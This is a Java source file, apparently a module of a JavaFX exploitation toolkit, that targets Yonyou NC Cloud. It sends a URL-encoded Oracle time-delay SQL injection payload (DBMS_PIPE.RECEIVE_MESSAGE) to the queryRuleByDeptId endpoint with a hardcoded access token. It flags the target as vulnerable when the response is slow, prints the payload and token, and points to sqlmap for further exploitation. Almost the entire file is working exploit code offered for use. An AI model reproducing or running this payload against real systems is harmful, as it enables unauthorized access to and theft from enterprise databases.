package exp.oa.yongyou.ncc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class yongyou_nc_cloud_queryRuleByDeptId_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("accessTokenNcc","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ");
            long var = HttpTools_getTime.get(url + "/ncchr/attendcalendar/queryRuleByDeptId?orgId=%33%27%20%41%4e%44%20%37%34%36%36%3d%44%42%4d%53%5f%50%49%50%45%2e%52%45%43%45%49%56%45%5f%4d%45%53%53%41%47%45%28%43%48%52%28%39%37%29%7c%7c%43%48%52%28%37%36%29%7c%7c%43%48%52%28%38%36%29%7c%7c%43%48%52%28%37%31%29%2c%33%29%2d%2d%20%71%69%54%6c" , head, "utf-8");
            if (var > 3000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_nc_cloud_queryRuleByDeptId_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,注入类型:延时注入,sql:oracle");
                    textArea.appendText("\n");
                });

                String target_req = url+"/ncchr/attendcalendar/queryRuleByDeptId?orgId=%33%27%20%41%4e%44%20%37%34%36%36%3d%44%42%4d%53%5f%50%49%50%45%2e%52%45%43%45%49%56%45%5f%4d%45%53%53%41%47%45%28%43%48%52%28%39%37%29%7c%7c%43%48%52%28%37%36%29%7c%7c%43%48%52%28%38%36%29%7c%7c%43%48%52%28%37%31%29%2c%33%29%2d%2d%20%71%69%54%6c";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +"\naccessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ"+
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
